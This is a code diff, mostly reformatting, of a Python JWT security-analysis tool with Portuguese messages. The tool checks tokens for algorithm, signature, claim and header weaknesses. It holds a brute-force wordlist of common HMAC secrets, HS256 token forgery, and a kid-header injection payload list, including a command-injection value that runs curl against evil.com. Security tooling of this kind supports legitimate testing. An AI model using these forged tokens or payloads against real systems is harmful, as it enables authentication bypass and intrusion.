@@ -16,6 +16,7 @@ Fluxo:
   4. Opcionalmente envia tokens forjados ao servidor via --url
   5. Retorna resultado consolidado com severidade
 """
+
 import argparse
 import base64
 import json
@@ -42,54 +43,148 @@ logger = logging.getLogger("mytools.jwtanalysis")
 
 _CATEGORY_MAP: dict[str, list[str]] = {
     "weak_algorithm": [
-        "alg_none", "alg_none_with_typ", "hs256_rsa_key_confusion",
-        "weak_hmac_secret", "algorithm_downgrade",
+        "alg_none",
+        "alg_none_with_typ",
+        "hs256_rsa_key_confusion",
+        "weak_hmac_secret",
+        "algorithm_downgrade",
     ],
     "signature_bypass": [
-        "empty_signature", "forged_hmac", "jwk_embedded_confusion",
+        "empty_signature",
+        "forged_hmac",
+        "jwk_embedded_confusion",
         "stripped_signature",
     ],
     "expiration": [
-        "expired_token", "missing_exp", "long_expiry", "future_nbf",
+        "expired_token",
+        "missing_exp",
+        "long_expiry",
+        "future_nbf",
     ],
     "claims": [
-        "role_escalation", "tenant_claim", "missing_sub",
-        "missing_iss", "audience_bypass",
+        "role_escalation",
+        "tenant_claim",
+        "missing_sub",
+        "missing_iss",
+        "audience_bypass",
     ],
     "header_injection": [
-        "kid_path_traversal", "jku_redirect", "x5u_redirect",
-        "jwk_embedded", "custom_header",
+        "kid_path_traversal",
+        "jku_redirect",
+        "x5u_redirect",
+        "jwk_embedded",
+        "custom_header",
     ],
     "replay": [
-        "no_jti", "missing_aud", "no_issuer_claim", "missing_iat",
+        "no_jti",
+        "missing_aud",
+        "no_issuer_claim",
+        "missing_iat",
     ],
 }
 
 _COMMON_SECRETS_DEFAULT = [
-    "secret", "password", "123456", "jwt_secret", "changeme",
-    "key123", "supersecret", "mysecret", "test", "admin",
-    "12345678", "qwerty", "abc123", "password1", "letmein",
-    "welcome", "monkey", "dragon", "master", "hello",
-    "freedom", "whatever", "trustno1", "shadow", "iloveyou",
-    "1234567", "sunshine", "princess", "football", "charlie",
-    "donald", "batman", "access", "hockey", "ranger",
-    "buster", "thomas", "hunter", "mustang", "michael",
-    "12345", "1234567890", "baseball", "soccer", "phoenix",
-    "matrix", "summer", "winter", "spring", "autumn",
-    "passw0rd", "secret123", "jwt_secret_key", "HS256",
-    "token", "auth", "bearer", "login", "session",
-    "api_key", "apikey", "private", "public", "rsa",
-    "asymmetric", "symmetric", "hmac", "sha256", "none",
-    "admin123", "root", "toor", "default", "test123",
-    "dev", "production", "staging", "local", "localhost",
-    "example", "demo", "sample", "temp", "tmp",
-    "a", "b", "c", "x", "y", "z",
-    "0", "1", "2", "3", "4",
+    "secret",
+    "password",
+    "123456",
+    "jwt_secret",
+    "changeme",
+    "key123",
+    "supersecret",
+    "mysecret",
+    "test",
+    "admin",
+    "12345678",
+    "qwerty",
+    "abc123",
+    "password1",
+    "letmein",
+    "welcome",
+    "monkey",
+    "dragon",
+    "master",
+    "hello",
+    "freedom",
+    "whatever",
+    "trustno1",
+    "shadow",
+    "iloveyou",
+    "1234567",
+    "sunshine",
+    "princess",
+    "football",
+    "charlie",
+    "donald",
+    "batman",
+    "access",
+    "hockey",
+    "ranger",
+    "buster",
+    "thomas",
+    "hunter",
+    "mustang",
+    "michael",
+    "12345",
+    "1234567890",
+    "baseball",
+    "soccer",
+    "phoenix",
+    "matrix",
+    "summer",
+    "winter",
+    "spring",
+    "autumn",
+    "passw0rd",
+    "secret123",
+    "jwt_secret_key",
+    "HS256",
+    "token",
+    "auth",
+    "bearer",
+    "login",
+    "session",
+    "api_key",
+    "apikey",
+    "private",
+    "public",
+    "rsa",
+    "asymmetric",
+    "symmetric",
+    "hmac",
+    "sha256",
+    "none",
+    "admin123",
+    "root",
+    "toor",
+    "default",
+    "test123",
+    "dev",
+    "production",
+    "staging",
+    "local",
+    "localhost",
+    "example",
+    "demo",
+    "sample",
+    "temp",
+    "tmp",
+    "a",
+    "b",
+    "c",
+    "x",
+    "y",
+    "z",
+    "0",
+    "1",
+    "2",
+    "3",
+    "4",
 ]
 
 
 def _load_jwt_secrets() -> list[str]:
     from mytools.data import load_payloads
+
     data = load_payloads("web", "jwt_common_secrets", default={"secrets": _COMMON_SECRETS_DEFAULT})
     return data.get("secrets", _COMMON_SECRETS_DEFAULT)
 
@@ -101,7 +196,7 @@ def _decode_jwt_header(token: str) -> dict[str, str] | None:
     """Decodifica o header JWT sem verificacao."""
     try:
         return jwt.get_unverified_header(token)
-    except (jwt.exceptions.DecodeError, AttributeError, KeyError):
+    except jwt.exceptions.DecodeError, AttributeError, KeyError:
         return None
 
 
@@ -110,7 +205,7 @@ def _decode_jwt_payload(token: str) -> dict[str, object] | None:
     try:
         payload = jwt.decode(token, options={"verify_signature": False})
         return dict(payload)
-    except (jwt.exceptions.DecodeError, AttributeError, KeyError):
+    except jwt.exceptions.DecodeError, AttributeError, KeyError:
         return None
 
 
@@ -146,54 +241,66 @@ async def _test_weak_algorithm_category(token: str, payload: dict[str, object], 
     alg = header.get("alg", "")
     has_rsa = alg.startswith("RS") or alg.startswith("PS") or alg.startswith("ES") or alg == "EdDSA"
 
-    results.append({
-        "technique": "alg_none",
-        "category": "weak_algorithm",
-        "vulnerable": alg == "none",
-        "details": f"algoritmo declarado: {alg}" + (" — vulneravel a bypass de assinatura" if alg == "none" else ""),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "alg_none",
+            "category": "weak_algorithm",
+            "vulnerable": alg == "none",
+            "details": f"algoritmo declarado: {alg}" + (" — vulneravel a bypass de assinatura" if alg == "none" else ""),
+            "error": "",
+        }
+    )
 
-    results.append({
-        "technique": "alg_none_with_typ",
-        "category": "weak_algorithm",
-        "vulnerable": False,
-        "details": "teste de alg:none com header typ=JWT — requer forge offline para confirmar",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "alg_none_with_typ",
+            "category": "weak_algorithm",
+            "vulnerable": False,
+            "details": "teste de alg:none com header typ=JWT — requer forge offline para confirmar",
+            "error": "",
+        }
+    )
 
     if has_rsa:
-        results.append({
-            "technique": "hs256_rsa_key_confusion",
-            "category": "weak_algorithm",
-            "vulnerable": False,
-            "details": f"algoritmo {alg} detectado — possivel key confusion RS256->HS256",
-            "error": "",
-        })
+        results.append(
+            {
+                "technique": "hs256_rsa_key_confusion",
+                "category": "weak_algorithm",
+                "vulnerable": False,
+                "details": f"algoritmo {alg} detectado — possivel key confusion RS256->HS256",
+                "error": "",
+            }
+        )
     else:
-        results.append({
-            "technique": "hs256_rsa_key_confusion",
+        results.append(
+            {
+                "technique": "hs256_rsa_key_confusion",
+                "category": "weak_algorithm",
+                "vulnerable": False,
+                "details": f"algoritmo {alg} — key confusion RS256->HS256 nao aplicavel",
+                "error": "",
+            }
+        )
+
+    results.append(
+        {
+            "technique": "weak_hmac_secret",
             "category": "weak_algorithm",
             "vulnerable": False,
-            "details": f"algoritmo {alg} — key confusion RS256->HS256 nao aplicavel",
+            "details": "verificacao de segredos HMAC comuns — requer brute-force offline",
             "error": "",
-        })
+        }
+    )
 
-    results.append({
-        "technique": "weak_hmac_secret",
-        "category": "weak_algorithm",
-        "vulnerable": False,
-        "details": "verificacao de segredos HMAC comuns — requer brute-force offline",
-        "error": "",
-    })
-
-    results.append({
-        "technique": "algorithm_downgrade",
-        "category": "weak_algorithm",
-        "vulnerable": alg in ("none", "HS256", "HS384", "HS512") and not has_rsa,
-        "details": f"algoritmo {alg} — " + ("possivel downgrade para simetrico" if not has_rsa else "algoritmo assimetrico forte"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "algorithm_downgrade",
+            "category": "weak_algorithm",
+            "vulnerable": alg in ("none", "HS256", "HS384", "HS512") and not has_rsa,
+            "details": f"algoritmo {alg} — " + ("possivel downgrade para simetrico" if not has_rsa else "algoritmo assimetrico forte"),
+            "error": "",
+        }
+    )
 
     return results
 
@@ -203,39 +310,47 @@ async def _test_signature_bypass_category(token: str, payload: dict[str, object]
     results: list[dict[str, object]] = []
     _h, _p, sig = _split_token(token)
 
-    results.append({
-        "technique": "empty_signature",
-        "category": "signature_bypass",
-        "vulnerable": not sig,
-        "details": "assinatura vazia no token" + (" — vulneravel" if not sig else " — assinatura presente"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "empty_signature",
+            "category": "signature_bypass",
+            "vulnerable": not sig,
+            "details": "assinatura vazia no token" + (" — vulneravel" if not sig else " — assinatura presente"),
+            "error": "",
+        }
+    )
 
     forged = _forge_token_hs256(payload, "test")
     _fh, _fp, _fsig = _split_token(forged)
-    results.append({
-        "technique": "forged_hmac",
-        "category": "signature_bypass",
-        "vulnerable": False,
-        "details": "token forjado com HS256 — testar se servidor aceita com chave publica",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "forged_hmac",
+            "category": "signature_bypass",
+            "vulnerable": False,
+            "details": "token forjado com HS256 — testar se servidor aceita com chave publica",
+            "error": "",
+        }
+    )
 
-    results.append({
-        "technique": "jwk_embedded_confusion",
-        "category": "signature_bypass",
-        "vulnerable": False,
-        "details": "JWK embutido no header com HS256 — possivel confusion com chave publica",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "jwk_embedded_confusion",
+            "category": "signature_bypass",
+            "vulnerable": False,
+            "details": "JWK embutido no header com HS256 — possivel confusion com chave publica",
+            "error": "",
+        }
+    )
 
-    results.append({
-        "technique": "stripped_signature",
-        "category": "signature_bypass",
-        "vulnerable": False,
-        "details": "token com assinatura removida — testar se servidor aceita payload sem verificacao",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "stripped_signature",
+            "category": "signature_bypass",
+            "vulnerable": False,
+            "details": "token com assinatura removida — testar se servidor aceita payload sem verificacao",
+            "error": "",
+        }
+    )
 
     return results
 
@@ -243,6 +358,7 @@ async def _test_signature_bypass_category(token: str, payload: dict[str, object]
 async def _test_expiration_category(token: str, payload: dict[str, object], header: dict[str, str]) -> list[dict[str, object]]:
     """Testa problemas de expiracao."""
     import time
+
     results: list[dict[str, object]] = []
     now = time.time()
     exp = payload.get("exp")
@@ -253,37 +369,45 @@ async def _test_expiration_category(token: str, payload: dict[str, object], head
         try:
             exp_ts = float(str(exp))
             expired = exp_ts < now
-            results.append({
-                "technique": "expired_token",
-                "category": "expiration",
-                "vulnerable": expired,
-                "details": f"exp={int(exp_ts)} — " + ("token EXPIRADO" if expired else f"valido por {int((exp_ts - now) / 3600)}h"),
-                "error": "",
-            })
-        except (TypeError, ValueError):
-            results.append({
+            results.append(
+                {
+                    "technique": "expired_token",
+                    "category": "expiration",
+                    "vulnerable": expired,
+                    "details": f"exp={int(exp_ts)} — " + ("token EXPIRADO" if expired else f"valido por {int((exp_ts - now) / 3600)}h"),
+                    "error": "",
+                }
+            )
+        except TypeError, ValueError:
+            results.append(
+                {
+                    "technique": "expired_token",
+                    "category": "expiration",
+                    "vulnerable": False,
+                    "details": f"exp invalido: {exp}",
+                    "error": "",
+                }
+            )
+    else:
+        results.append(
+            {
                 "technique": "expired_token",
                 "category": "expiration",
                 "vulnerable": False,
-                "details": f"exp invalido: {exp}",
+                "details": "claim 'exp' ausente — token sem expiracao definida",
                 "error": "",
-            })
-    else:
-        results.append({
-            "technique": "expired_token",
-            "category": "expiration",
-            "vulnerable": False,
-            "details": "claim 'exp' ausente — token sem expiracao definida",
-            "error": "",
-        })
+            }
+        )
 
-    results.append({
-        "technique": "missing_exp",
-        "category": "expiration",
-        "vulnerable": exp is None,
-        "details": "claim 'exp' " + ("ausente" if exp is None else "presente"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "missing_exp",
+            "category": "expiration",
+            "vulnerable": exp is None,
+            "details": "claim 'exp' " + ("ausente" if exp is None else "presente"),
+            "error": "",
+        }
+    )
 
     if exp is not None and iat is not None:
         try:
@@ -291,57 +415,69 @@ async def _test_expiration_category(token: str, payload: dict[str, object], head
             iat_ts = float(str(iat))
             duration_days = (exp_ts - iat_ts) / 86400
             long_expiry = duration_days > 365
-            results.append({
-                "technique": "long_expiry",
-                "category": "expiration",
-                "vulnerable": long_expiry,
-                "details": f"duracao: {int(duration_days)} dias — " + ("excessivamente longo" if long_expiry else "aceitavel"),
-                "error": "",
-            })
-        except (TypeError, ValueError):
-            results.append({
+            results.append(
+                {
+                    "technique": "long_expiry",
+                    "category": "expiration",
+                    "vulnerable": long_expiry,
+                    "details": f"duracao: {int(duration_days)} dias — " + ("excessivamente longo" if long_expiry else "aceitavel"),
+                    "error": "",
+                }
+            )
+        except TypeError, ValueError:
+            results.append(
+                {
+                    "technique": "long_expiry",
+                    "category": "expiration",
+                    "vulnerable": False,
+                    "details": "nao foi possivel calcular duracao",
+                    "error": "",
+                }
+            )
+    else:
+        results.append(
+            {
                 "technique": "long_expiry",
                 "category": "expiration",
                 "vulnerable": False,
-                "details": "nao foi possivel calcular duracao",
+                "details": "exp e/ou iat ausente — duracao nao calculavel",
                 "error": "",
-            })
-    else:
-        results.append({
-            "technique": "long_expiry",
-            "category": "expiration",
-            "vulnerable": False,
-            "details": "exp e/ou iat ausente — duracao nao calculavel",
-            "error": "",
-        })
+            }
+        )
 
     if nbf is not None:
         try:
             nbf_ts = float(str(nbf))
             future_nbf = nbf_ts > now + 3600
-            results.append({
-                "technique": "future_nbf",
-                "category": "expiration",
-                "vulnerable": future_nbf,
-                "details": f"nbf={int(nbf_ts)} — " + ("no futuro (suspeito)" if future_nbf else "ok"),
-                "error": "",
-            })
-        except (TypeError, ValueError):
-            results.append({
+            results.append(
+                {
+                    "technique": "future_nbf",
+                    "category": "expiration",
+                    "vulnerable": future_nbf,
+                    "details": f"nbf={int(nbf_ts)} — " + ("no futuro (suspeito)" if future_nbf else "ok"),
+                    "error": "",
+                }
+            )
+        except TypeError, ValueError:
+            results.append(
+                {
+                    "technique": "future_nbf",
+                    "category": "expiration",
+                    "vulnerable": False,
+                    "details": f"nbf invalido: {nbf}",
+                    "error": "",
+                }
+            )
+    else:
+        results.append(
+            {
                 "technique": "future_nbf",
                 "category": "expiration",
                 "vulnerable": False,
-                "details": f"nbf invalido: {nbf}",
+                "details": "claim 'nbf' ausente",
                 "error": "",
-            })
-    else:
-        results.append({
-            "technique": "future_nbf",
-            "category": "expiration",
-            "vulnerable": False,
-            "details": "claim 'nbf' ausente",
-            "error": "",
-        })
+            }
+        )
 
     return results
 
@@ -352,49 +488,59 @@ async def _test_claims_category(token: str, payload: dict[str, object], header: 
     role = str(payload.get("role", "")).lower()
     is_admin = role in ("admin", "administrator", "root", "superuser")
 
-    results.append({
-        "technique": "role_escalation",
-        "category": "claims",
-        "vulnerable": is_admin,
-        "details": f"role={payload.get('role', 'N/A')} — " + ("privilegio elevado detectado" if is_admin else "privilegio normal"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "role_escalation",
+            "category": "claims",
+            "vulnerable": is_admin,
+            "details": f"role={payload.get('role', 'N/A')} — " + ("privilegio elevado detectado" if is_admin else "privilegio normal"),
+            "error": "",
+        }
+    )
 
     tenant = payload.get("tenant") or payload.get("tenant_id") or payload.get("org") or payload.get("org_id")
-    results.append({
-        "technique": "tenant_claim",
-        "category": "claims",
-        "vulnerable": tenant is not None,
-        "details": f"tenant claim: {tenant or 'ausente'} — manipulacao possivel" if tenant else "nenhum tenant claim encontrado",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "tenant_claim",
+            "category": "claims",
+            "vulnerable": tenant is not None,
+            "details": f"tenant claim: {tenant or 'ausente'} — manipulacao possivel" if tenant else "nenhum tenant claim encontrado",
+            "error": "",
+        }
+    )
 
     sub = payload.get("sub")
-    results.append({
-        "technique": "missing_sub",
-        "category": "claims",
-        "vulnerable": sub is None,
-        "details": f"sub: {sub or 'ausente'} — " + ("claim 'sub' obrigatorio ausente" if sub is None else "presente"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "missing_sub",
+            "category": "claims",
+            "vulnerable": sub is None,
+            "details": f"sub: {sub or 'ausente'} — " + ("claim 'sub' obrigatorio ausente" if sub is None else "presente"),
+            "error": "",
+        }
+    )
 
     iss = payload.get("iss")
-    results.append({
-        "technique": "missing_iss",
-        "category": "claims",
-        "vulnerable": iss is None,
-        "details": f"iss: {iss or 'ausente'} — " + ("claim 'iss' ausente" if iss is None else f"presente: {iss}"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "missing_iss",
+            "category": "claims",
+            "vulnerable": iss is None,
+            "details": f"iss: {iss or 'ausente'} — " + ("claim 'iss' ausente" if iss is None else f"presente: {iss}"),
+            "error": "",
+        }
+    )
 
     aud = payload.get("aud")
-    results.append({
-        "technique": "audience_bypass",
-        "category": "claims",
-        "vulnerable": aud is None,
-        "details": f"aud: {aud or 'ausente'} — " + ("sem validacao de audience" if aud is None else "presente"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "audience_bypass",
+            "category": "claims",
+            "vulnerable": aud is None,
+            "details": f"aud: {aud or 'ausente'} — " + ("sem validacao de audience" if aud is None else "presente"),
+            "error": "",
+        }
+    )
 
     return results
 
@@ -416,45 +562,55 @@ async def _test_header_injection_category(
         ("key1; curl http://evil.com", "command injection via kid"),
     ]
 
-    results.append({
-        "technique": "kid_path_traversal",
-        "category": "header_injection",
-        "vulnerable": False,
-        "details": f"{len(kid_payloads)} payloads de kid injection testados — requer envio ao servidor",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "kid_path_traversal",
+            "category": "header_injection",
+            "vulnerable": False,
+            "details": f"{len(kid_payloads)} payloads de kid injection testados — requer envio ao servidor",
+            "error": "",
+        }
+    )
 
-    results.append({
-        "technique": "jku_redirect",
-        "category": "header_injection",
-        "vulnerable": False,
-        "details": "jku apontando para servidor externo — requer envio ao servidor",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "jku_redirect",
+            "category": "header_injection",
+            "vulnerable": False,
+            "details": "jku apontando para servidor externo — requer envio ao servidor",
+            "error": "",
+        }
+    )
 
-    results.append({
-        "technique": "x5u_redirect",
-        "category": "header_injection",
-        "vulnerable": False,
-        "details": "x5u apontando para certificado externo — requer envio ao servidor",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "x5u_redirect",
+            "category": "header_injection",
+            "vulnerable": False,
+            "details": "x5u apontando para certificado externo — requer envio ao servidor",
+            "error": "",
+        }
+    )
 
-    results.append({
-        "technique": "jwk_embedded",
-        "category": "header_injection",
-        "vulnerable": False,
-        "details": "JWK embutido no header com chave publica — requer envio ao servidor",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "jwk_embedded",
+            "category": "header_injection",
+            "vulnerable": False,
+            "details": "JWK embutido no header com chave publica — requer envio ao servidor",
+            "error": "",
+        }
+    )
 
-    results.append({
-        "technique": "custom_header",
-        "category": "header_injection",
-        "vulnerable": False,
-        "details": "header customizado para bypass — requer envio ao servidor",
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "custom_header",
+            "category": "header_injection",
+            "vulnerable": False,
+            "details": "header customizado para bypass — requer envio ao servidor",
+            "error": "",
+        }
+    )
 
     return results
 
@@ -464,40 +620,48 @@ async def _test_replay_category(token: str, payload: dict[str, object], header: 
     results: list[dict[str, object]] = []
 
     jti = payload.get("jti")
-    results.append({
-        "technique": "no_jti",
-        "category": "replay",
-        "vulnerable": jti is None,
-        "details": f"jti: {jti or 'ausente'} — " + ("token sem identificador unico, reutilizavel" if jti is None else "identificador presente"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "no_jti",
+            "category": "replay",
+            "vulnerable": jti is None,
+            "details": f"jti: {jti or 'ausente'} — " + ("token sem identificador unico, reutilizavel" if jti is None else "identificador presente"),
+            "error": "",
+        }
+    )
 
     aud = payload.get("aud")
-    results.append({
-        "technique": "missing_aud",
-        "category": "replay",
-        "vulnerable": aud is None,
-        "details": f"aud: {aud or 'ausente'} — " + ("sem audience, token reutilizavel em qualquer servico" if aud is None else "presente"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "missing_aud",
+            "category": "replay",
+            "vulnerable": aud is None,
+            "details": f"aud: {aud or 'ausente'} — " + ("sem audience, token reutilizavel em qualquer servico" if aud is None else "presente"),
+            "error": "",
+        }
+    )
 
     iss = payload.get("iss")
-    results.append({
-        "technique": "no_issuer_claim",
-        "category": "replay",
-        "vulnerable": iss is None,
-        "details": f"iss: {iss or 'ausente'} — " + ("sem issuer, token reutilizavel" if iss is None else f"presente: {iss}"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "no_issuer_claim",
+            "category": "replay",
+            "vulnerable": iss is None,
+            "details": f"iss: {iss or 'ausente'} — " + ("sem issuer, token reutilizavel" if iss is None else f"presente: {iss}"),
+            "error": "",
+        }
+    )
 
     iat = payload.get("iat")
-    results.append({
-        "technique": "missing_iat",
-        "category": "replay",
-        "vulnerable": iat is None,
-        "details": f"iat: {iat or 'ausente'} — " + ("sem issued-at, impossivel calcular idade do token" if iat is None else "presente"),
-        "error": "",
-    })
+    results.append(
+        {
+            "technique": "missing_iat",
+            "category": "replay",
+            "vulnerable": iat is None,
+            "details": f"iat: {iat or 'ausente'} — " + ("sem issued-at, impossivel calcular idade do token" if iat is None else "presente"),
+            "error": "",
+        }
+    )
 
     return results
 
@@ -607,23 +771,28 @@ async def run_scan(
                 raw = await tester(token, payload, header, target, timeout)
             else:
                 raw = await tester(token, payload, header)
-            all_attempts.extend(JWTAnalysisAttempt(
-                exploit="jwt_tool <token> -C -d <dict>",
-                tool="jwt_tool",
-                technique=str(item["technique"]),
-                category=str(item["category"]),
-                vulnerable=bool(item["vulnerable"]),
-                details=str(item["details"]),
-                error=str(item["error"]),
-            ) for item in raw)
+            all_attempts.extend(
+                JWTAnalysisAttempt(
+                    exploit="jwt_tool <token> -C -d <dict>",
+                    tool="jwt_tool",
+                    technique=str(item["technique"]),
+                    category=str(item["category"]),
+                    vulnerable=bool(item["vulnerable"]),
+                    details=str(item["details"]),
+                    error=str(item["error"]),
+                )
+                for item in raw
+            )
         except Exception as e:
-            all_attempts.append(JWTAnalysisAttempt(
-                technique=f"{cat}_error",
-                category=cat,
-                vulnerable=False,
-                details="",
-                error=str(e)[:100],
-            ))
+            all_attempts.append(
+                JWTAnalysisAttempt(
+                    technique=f"{cat}_error",
+                    category=cat,
+                    vulnerable=False,
+                    details="",
+                    error=str(e)[:100],
+                )
+            )
 
     vuln_techs = list({a.technique for a in all_attempts if a.vulnerable})
     issues_list: list[str] = []
@@ -687,10 +856,10 @@ def build_parser() -> argparse.ArgumentParser:
     )
     parser.add_argument("token", nargs="?", help="Token JWT para analisar")
     parser.add_argument(
-        "-c", "--category",
+        "-c",
+        "--category",
         default="all",
-        choices=["all", "weak_algorithm", "signature_bypass", "expiration",
-                 "claims", "header_injection", "replay"],
+        choices=["all", "weak_algorithm", "signature_bypass", "expiration", "claims", "header_injection", "replay"],
         help="Categoria de testes (default: todas)",
     )
     parser.add_argument("--file", help="Arquivo com token JWT (um por linha)")
@@ -710,7 +879,7 @@ def run_once(args: argparse.Namespace) -> int:
         try:
             content = Path(file_path).read_text(encoding="utf-8").strip()
             token = content.splitlines()[0] if content else ""
-        except (OSError, IndexError):
+        except OSError, IndexError:
             print(color(f"Erro ao ler arquivo: {file_path}", Cyber.RED))
             return 1
 
